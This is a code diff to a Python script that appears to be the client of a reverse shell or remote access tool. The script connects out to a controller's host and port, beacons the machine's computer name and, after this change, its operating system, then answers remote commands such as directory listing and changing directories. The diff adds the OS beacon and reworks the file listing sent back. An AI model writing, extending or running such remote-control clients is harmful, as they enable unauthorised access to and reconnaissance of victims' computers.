@@ -1,4 +1,4 @@
-import socket, os, subprocess, pathlib
+import socket, os, subprocess, pathlib, platform
 
 received = b''
 currentPath = os.getcwd()
@@ -20,7 +20,7 @@ def connect():
 			print('[!] Trying To Connect To %s:%s'%(host, port))
 			s.connect((host,port))
 			print('[*] Connection Established')
-			s.send(str(os.environ['COMPUTERNAME']).encode('utf8'))
+			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system()).encode('utf8'))
 			notConnected = False
 		except Exception as e:
 			print('Could Not Connect: ', e)
@@ -56,12 +56,14 @@ def receive():
 		currentPath = os.getcwd()
 		currentDirectory = pathlib.Path(currentPath)
 		files = []
+		files.append('<DIR> .')
+		files.append('<DIR> ..')
 		for file in currentDirectory.iterdir():
 			if os.path.isdir(file):
-				files.append(str(file) + ' <DIR>')
+				files.append('<DIR> ' + str(file)[len(currentPath) + 1:])
 			else:
-				files.append(str(file))
-		args = '\n' + '\n'.join(files)
+				files.append('      ' + str(file)[len(currentPath) + 1:])
+		args = 'Current Directory: ' + currentPath + '\n' + '\n'.join(files)
 
 	elif checkCom('cd'):
 		if os.path.isdir(received):
